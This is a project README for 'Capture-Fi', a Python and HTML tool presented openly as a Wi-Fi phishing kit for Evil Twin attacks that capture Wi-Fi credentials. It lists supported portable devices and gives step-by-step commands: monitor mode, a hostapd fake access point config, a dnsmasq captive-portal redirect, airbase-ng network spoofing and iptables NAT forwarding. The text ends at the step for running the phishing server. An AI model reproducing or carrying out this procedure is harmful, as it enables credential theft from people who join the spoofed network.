<h1 align="center">Capture-Fi 🛜</h1>

**Capture-Fi** is a lightweight tool built with **Python** and **HTML**, designed for **Wi-Fi phishing**.  
It enables the setup of an **Evil Twin attack**, allowing you to capture Wi-Fi credentials by mimicking a legitimate access point.

## Features
```- Wi-Fi phishing using an Evil Twin method.```<br>
```- Customizable fake login page using HTML.```<br>
```- Lightweight and easy to use.```<br>
```- Built-in Python server to host the phishing page.```<br>
```- Compatible with a wide range of devices, including Raspberry Pi Zero W, M5StickC Plus, and ESP32/ESP8266.```

## Prerequisites
- Python 3.x
- Wi-Fi adapter with monitor mode and packet injection support (necessary)
- Parrot OS or any other Linux distribution (necessary)
- If you want to create a portable Wi-Fi phishing device, you can choose from the following devices:
  - **Raspberry Pi Zero W**: Compact and versatile, ideal for various hacking projects.
  - **M5StickC Plus**: A small, easy-to-use microcontroller with built-in display.
  - **ESP32/ESP8266**: Popular microcontrollers with Wi-Fi capabilities, suitable for a range of IoT applications.
  
## Installation

To set up **Capture-Fi**, follow these steps:

1. **Clone the Repository**:
   ```bash
   git clone https://github.com/Infosec-Ivan/Capture-Fi.git
   cd Capture-Fi


## Setup Process

If you have a Wi-Fi adapter that supports monitor mode, packet injection, and access point (AP) mode, and you are using a Linux distribution, follow these steps to start an Evil Twin attack with a captive portal redirecting to `server.py`:

### 1. Install Required Tools

Ensure you have the necessary tools installed. Use `aircrack-ng` and `hostapd` for this setup. Install them with:

```sudo apt update```<br>
```sudo apt install aircrack-ng hostapd```


## 2. Prepare Your Wi-Fi AdapterEnable Monitor Mode:

```sudo ip link set <interface> down```<br>
```sudo ip link set <interface> up```<b>
```sudo ip link set <interface> monitor```
**Replace <interface> with your Wi-Fi adapter's interface name (e.g., wlan0).**

## 3. Configure the Captive Portal

`- Create a Fake Access Point with hostapd: Create a configuration file (/etc/hostapd/hostapd.conf) for hostapd:`

`interface=<interface>
driver=nl80211
ssid=FakeNetwork
hw_mode=g
channel=6`

**Start hostapd with:**
```sudo hostapd /etc/hostapd/hostapd.conf```

**- Set Up the Captive Portal Redirect: Create a default configuration file for dnsmasq (/etc/dnsmasq.conf):**

`interface=<interface>
dhcp-range=10.0.0.2,10.0.0.20,12h
address=/example.com/10.0.0.1`

**- Replace <interface> with your Wi-Fi adapter’s interface.**
**- Replace example.com with the domain or IP that you want to redirect to.**

## 4. Start the Fake Access Point
**- Create the Fake Network: Use airbase-ng to create a fake network:**
`sudo airbase-ng -e "FakeNetwork" -c 6 <interface>`
**-Replace <interface> with your Wi-Fi adapter’s interface.**

## 5. Configure IP Forwarding and NAT

**- Set up IP forwarding and NAT to route traffic through your server:**
`sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -t nat -A POSTROUTING -o <internet-interface> -j MASQUERADE
sudo iptables -A FORWARD -i <interface> -o <internet-interface> -m state --state RELATED,ESTABLISHED -j ACCEPT
sudo iptables -A FORWARD -i <internet-interface> -o <interface> -j ACCEPT`

## 6. Deploy and Run server.py



